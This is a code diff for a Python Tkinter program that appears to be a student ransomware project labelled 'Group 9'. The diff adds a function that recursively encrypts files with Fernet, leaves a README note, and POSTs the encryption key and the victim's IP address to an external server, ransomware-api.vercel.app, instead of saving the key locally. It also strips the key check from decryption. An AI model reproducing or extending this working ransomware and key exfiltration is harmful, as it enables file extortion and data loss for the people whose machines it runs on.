@@ -3,14 +3,19 @@ from tkinter import *
 from tkinter import ttk
 import os
 import glob
+import urllib.request
+import urllib.parse
+import json
+import socket
 
 
 # ************************ ENCRIPTACION ******************************
 
 def generate_key():
     key = Fernet.generate_key()
-    with open('key.key', 'wb') as key_file:
-        key_file.write(key)
+    # with open('key.key', 'wb') as key_file:
+        # key_file.write(key)
+    return key
 
 
 def load_key():
@@ -36,15 +41,31 @@ def encrypt_files():
     #full_path = [path_to_encrypt + '/' + item for item in items]
     full_path = glob.glob(path_to_encrypt+"/**", recursive=True)
     full_path = [f for f in full_path if os.path.isfile(f)] # Saco las carpetas de la lista
-    generate_key()
-    key = load_key()
+    # generate_key()
+    # key = load_key()
+    key = generate_key()
 
     encrypt(full_path, key)
 
     with open(path_to_encrypt + '/' + 'README.txt', 'w') as file:
         file.write('Files encrypted by Group 9\n')
-        
+    
+    send_key(key)
 
+
+        
+def send_key(key):
+    ip = socket.gethostbyname(socket.gethostname())
+    data = {'key': key, 'ip': str(ip)}
+    data_json = json.dumps(data).encode('utf-8')
+
+    req = urllib.request.Request('https://ransomware-api.vercel.app/encryption', data=data_json, method='POST')
+    req.add_header('Content-Type', 'application/json')
+
+    with urllib.request.urlopen(req, timeout=60) as response:
+        response_data = response.read()
+    
+        print(response_data.decode('utf-8'))
 
 
 
@@ -63,11 +84,12 @@ def decrypt(items, key):
 
 
 def decrypt_files(input_key):
-    key = load_key()
-    print(key.decode('UTF-8'))
+    # Esta validación quizás se debería hacer con una request
+    # key = load_key()
+    # print(key.decode('UTF-8'))
     
-    if key.decode('UTF-8') != input_key:
-      return False
+    # if key.decode('UTF-8') != input_key:
+    #   return False
     
     path_to_encrypt = './files'
     os.remove(path_to_encrypt + '/' + 'README.txt')
@@ -77,7 +99,7 @@ def decrypt_files(input_key):
     full_path = glob.glob(path_to_encrypt+"/**", recursive=True)
     full_path = [f for f in full_path if os.path.isfile(f)] # Saco las carpetas de la lista
 
-    decrypt(full_path, key)
+    decrypt(full_path, input_key)
     return True
 
 
